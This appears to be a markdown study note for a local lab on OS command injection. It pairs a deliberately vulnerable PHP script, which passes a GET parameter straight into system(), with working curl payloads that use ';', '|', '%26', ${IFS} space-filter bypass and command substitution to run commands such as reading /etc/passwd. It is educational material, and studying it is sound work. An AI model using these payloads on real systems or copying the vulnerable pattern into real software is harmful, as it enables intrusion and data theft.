# Token Splitting

## Goal

Understand:

- shell token splitting
- no-space payload construction
- $IFS behavior
- command substitution
- parser stage separation
- URL decoding vs shell interpretation
- background execution behavior

---

# Environment

## PHP Mock

```php
<?php
$ip = $_GET["ip"];

$cmd = "echo START; ping -c 1 $ip; echo END";
echo "CMD: $cmd\n";

system($cmd);
?>
````

---

## Base Request

```bash
curl 'http://localhost:8000/session02.php?ip=127.0.0.1'
```

---

# Core Concepts

---

# 1. Shell Token Splitting

Shell splits command tokens using:

* space
* tab
* newline

---

## Example

```sh
cat /etc/passwd
```

becomes:

```text
argv[0] = cat
argv[1] = /etc/passwd
```

---

# 2. Command Separator

## Common Separators

```sh
;
|
||
&&
&
```

---

## Behavior

### `;`

```sh
cmd1 ; cmd2
```

execute sequentially.

---

### `|`

```sh
cmd1 | cmd2
```

stdout of cmd1 becomes stdin of cmd2.

---

### `&&`

```sh
cmd1 && cmd2
```

execute cmd2 only if cmd1 succeeds.

---

### `&`

```sh
cmd1 &
```

run cmd1 in background.

---

# 3. Space Filtering Problem

## Example

```sh
cat/etc/passwd
```

fails because shell interprets entire string as command token.

---

## Important

Without token separator:

```text
cat/etc/passwd
```

≠

```text
cat /etc/passwd
```

---

# 4. $IFS Expansion

## Example

```sh
cat${IFS}/etc/passwd
```

---

## Meaning

`${IFS}` expands to shell field separator.

Usually:

```text
space
tab
newline
```

---

## Result

```sh
cat /etc/passwd
```

---

# Important

Expansion occurs before token splitting.

---

## Parser Flow

```text
cat${IFS}/etc/passwd
↓ expansion
cat /etc/passwd
↓ token split
argv[0] = cat
argv[1] = /etc/passwd
```

---

# 5. Command Substitution

## Syntax

```sh
$(command)
```

or

```sh
`command`
```

---

## Example

```sh
echo$(whoami)
```

---

## Parser Behavior

```text
1. execute whoami
2. capture stdout
3. substitute output into original position
```

---

## Result

```sh
echoh
```

which may become:

```text
command not found
```

---

# 6. Backtick vs $()

## Common Point

Both are command substitution.

---

## Difference

```sh
$( )
```

is generally cleaner and nestable.

---

# 7. URL Decoding vs Shell Parsing

## Raw HTTP

```text
%26
```

is NOT shell syntax.

---

## Flow

```text
HTTP raw
↓
URL decoding
↓
&
↓
shell interpretation
```

---

## Important

`%26` only becomes shell operator after HTTP/PHP decoding.

---

# 8. HTTP Parser vs Shell Parser

## Example

```text
127.0.0.1&whoami
```

---

## Problem

`&` may become HTTP query separator.

---

## Encoded Version

```text
127.0.0.1%26whoami
```

---

## Parser Separation

### HTTP parser

```text
%26 → &
```

### shell parser

```text
& → background operator
```

---

# 9. Background Execution

## Example

```sh
ping -c 1 127.0.0.1 & whoami
```

---

## Behavior

```text
1. ping starts
2. ping moved to background
3. shell immediately executes whoami
```

---

# Important

Output ordering may become unstable.

---

## Why?

Because multiple processes may write stdout simultaneously.

---

# 10. Pipe Behavior

## Example

```sh
ping -c 1 127.0.0.1 | whoami
```

---

## Important

`whoami` ignores stdin.

So:

```text
ping stdout
→ discarded effectively
```

while `whoami` still executes.

---

# Useful curl Examples

---

## Basic Separator

```text
127.0.0.1;id
```

```bash
curl 'http://localhost:8000/session02.php?ip=127.0.0.1;id'
```

---

## Failed No-Space Payload

```text
127.0.0.1;cat/etc/passwd
```

```bash
curl 'http://localhost:8000/session02.php?ip=127.0.0.1;cat/etc/passwd'
```

---

## $IFS Bypass

```text
127.0.0.1;cat${IFS}/etc/passwd
```

```bash
curl 'http://localhost:8000/session02.php?ip=127.0.0.1;cat${IFS}/etc/passwd'
```

---

## Command Substitution

```text
127.0.0.1;echo$(whoami)
```

```bash
curl 'http://localhost:8000/session02.php?ip=127.0.0.1;echo$(whoami)'
```

---

## Backtick Substitution

```text
127.0.0.1;echo`whoami`
```

```bash
curl 'http://localhost:8000/session02.php?ip=127.0.0.1;echo`whoami`'
```

---

## Pipe Injection

```text
127.0.0.1|whoami
```

```bash
curl 'http://localhost:8000/session02.php?ip=127.0.0.1%7Cwhoami'
```

---

## Background Injection

```text
127.0.0.1%26whoami
```

```bash
curl 'http://localhost:8000/session02.php?ip=127.0.0.1%26whoami'
```

---

# Key Patterns

---

## Pattern 1 — Shell Token Split

```text
space/tab/newline
→ token separator
```

---

## Pattern 2 — Expansion Before Tokenization

```text
${IFS}
↓
space
↓
token split
```

---

## Pattern 3 — Command Substitution

```text
$(cmd)
↓
execute command
↓
capture stdout
↓
replace original text
```

---

## Pattern 4 — HTTP Layer vs Shell Layer

```text
HTTP parser
≠
shell parser
```

---

## Pattern 5 — Encoded Operators Become Dangerous Later

```text
%26
↓ decode
&
↓ shell operator
```

---

## Pattern 6 — Background Execution Changes Output Timing

```sh
&
```

may cause:

* mixed stdout
* delayed output
* unstable ordering

---

# Mental Model

```text
input
→ HTTP parser
→ URL decode
→ PHP string
→ shell parser
→ expansion
→ token split
→ execution
```

Never confuse parser stages.

# QA

**Q1.**
Why does `cat/etc/passwd` not execute like `cat /etc/passwd`?

<details>
<summary><strong>A1.</strong></summary>

The shell does not infer a token boundary automatically. It interprets:

```text
cat/etc/passwd
```

as one token, not:

```text
cat + /etc/passwd
```


</details>

---

**Q2.**
Why can `${IFS}` bypass a space filter?

<details>
<summary><strong>A2.</strong></summary>

`${IFS}` expands to shell field-separator characters, commonly:

```text
space
tab
newline
```

Word splitting occurs after expansion:

```text
cat${IFS}/etc/passwd
↓ expansion
cat /etc/passwd
↓ token split
argv[0] = cat
argv[1] = /etc/passwd
```

</details>

---

**Q3.**
At which stage is `${IFS}` processed?

<details>
<summary><strong>A3.</strong></summary>

It is processed during shell expansion:

```text
HTTP input
→ URL decode
→ PHP string
→ shell expansion
→ token split
→ execution
```

It gains meaning when the shell reconstructs the final command line, not
during HTTP parsing or PHP string concatenation.

</details>

---

**Q4.**
What do `$(whoami)` and `` `whoami` `` have in common?

<details>
<summary><strong>A4.</strong></summary>

Both perform command substitution:

```text
1. execute the inner command
2. stdout capture
3. substitute the output at the original position
```

For example:

```text
echo$(whoami)
```

is interpreted again after the output of `whoami` is inserted.

</details>

---

**Q5.**
Why can `echo$(whoami)` execute substitution but still produce an unexpected result?

<details>
<summary><strong>A5.</strong></summary>

The substitution output is attached directly to the current token. For
example:

```text
echo$(whoami)
```

becomes, after substitution:

```text
echoh
```

may be parsed as one command name rather than `echo` plus an argument,
resulting in:

```text
command not found
```

This can cause a command-not-found error.

</details>

---

**Q6.**
Why is `%26` not a shell operator initially?

<details>
<summary><strong>A6.</strong></summary>

At the raw HTTP layer, `%26` is encoded text:

```text
HTTP raw
↓
URL decoding
↓
&
↓
shell interpretation
```

Only after URL decoding does it become `&`, which the shell may interpret as
a background operator.

</details>

---

**Q7.**
Why can sending `127.0.0.1&whoami` directly cause a problem?

<details>
<summary><strong>A7.</strong></summary>

The HTTP parser may treat `&` as a query-parameter separator. Encoding it:

```text
127.0.0.1&whoami
```

as:

```text
127.0.0.1%26whoami
```

helps deliver the intended character to the shell stage.

</details>

---

**Q8.**
Why can output ordering be unstable in `ping -c 1 127.0.0.1 & whoami`?

<details>
<summary><strong>A8.</strong></summary>

`&` sends the preceding command to the background:

```text
1. ping starts
2. ping moved to background
3. shell immediately executes whoami
```

Multiple processes may then write to stdout concurrently, causing:

```text
mixed stdout
delayed output
unstable ordering
```


</details>

---

**Q9.**
Why might only the `whoami` result be visible in `ping -c 1 127.0.0.1 | whoami`?

<details>
<summary><strong>A9.</strong></summary>

`whoami` does not consume stdin. The pipe exists:

```text
ping stdout
→ pipe
→ whoami stdin
```

but the input is ignored. As a result:

```text
the ping output is effectively discarded while `whoami` runs normally.
```

</details>
